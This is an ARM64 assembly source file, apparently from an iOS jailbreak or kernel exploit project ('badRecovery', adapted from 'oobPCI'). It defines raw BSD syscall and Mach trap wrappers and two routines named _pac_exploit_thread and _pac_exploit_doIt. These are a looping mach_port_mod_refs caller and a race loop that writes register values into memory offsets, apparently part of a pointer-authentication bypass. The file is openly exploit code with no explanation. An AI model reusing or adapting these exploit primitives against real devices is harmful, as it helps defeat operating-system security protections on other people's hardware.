//
//  badRecovery.s
//  badRecovery
//
//  Created by Lars Fröder on 26.01.24.
//

//
//  asm.S
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

.text

.align 4

#define SYSCALL_PROLOGUE stp x0, x1, [sp, -16]! %% stp x2, x3, [sp, -16]! %% stp x4, x5, [sp, -16]! %% stp x6, x7, [sp, -16]!
#define SYSCALL_EPILOGUE ldp x6, x7, [sp], 16 %% ldp x4, x5, [sp], 16 %% ldp x2, x3, [sp], 16 %% ldp x0, x1, [sp], 16

#define DEF_SYSCALL(name, num)  .global _##name %% _##name: %% SYSCALL_PROLOGUE %% mov x16, num %% svc #0x80 %% mov x16, x0 %% SYSCALL_EPILOGUE %% bcc name##_end %% cmp x16, #4 %% beq _##name %% mov x16, #-1 %% name##_end: %% mov x0, x16 %% ret
#define DEF_MACHTRAP(name, num) .global _##name %% _##name: %% mov x16, -num %% svc #0x80 %% ret

.global _pac_exploit_thread
_pac_exploit_thread:
    mov x0, x20
    bl _mach_port_mod_refs
    b _pac_exploit_thread

.global _pac_exploit_doIt
_pac_exploit_doIt:
    ldr x24, [x11, x25]
    dmb sy
    cmp x24, x20
    bne _pac_exploit_doIt
_pac_exploit_doIt_cont:
    str x19, [x11, x26]
    dmb sy
    ldr x24, [x11, x25]
    dmb sy
    cmp x24, x20
    bne _pac_exploit_doIt
    str x18, [x11, x27]
    dmb sy
    b _pac_exploit_doIt_cont

DEF_SYSCALL(exit,  1)
DEF_SYSCALL(write, 4)
DEF_SYSCALL(getpid, 20)
DEF_SYSCALL(getppid, 39)
DEF_SYSCALL(__semwait_signal, 334)

DEF_MACHTRAP(vm_allocate, 10)
DEF_MACHTRAP(vm_deallocate, 12)
DEF_MACHTRAP(vm_protect, 14)
DEF_MACHTRAP(mach_port_allocate, 16)
DEF_MACHTRAP(mach_port_deallocate, 18)
DEF_MACHTRAP(mach_port_mod_refs, 19)
DEF_MACHTRAP(mach_port_insert_right, 21)
DEF_MACHTRAP(mach_reply_port, 26)
DEF_MACHTRAP(mach_thread_self, 27)
DEF_MACHTRAP(mach_task_self, 28)
DEF_MACHTRAP(mach_host_self, 29)
DEF_MACHTRAP(mach_msg_trap, 31)
DEF_MACHTRAP(mach_msg_overwrite_trap, 32)
DEF_MACHTRAP(thread_switch, 61)

.data
retvalStorage:
    .quad 0
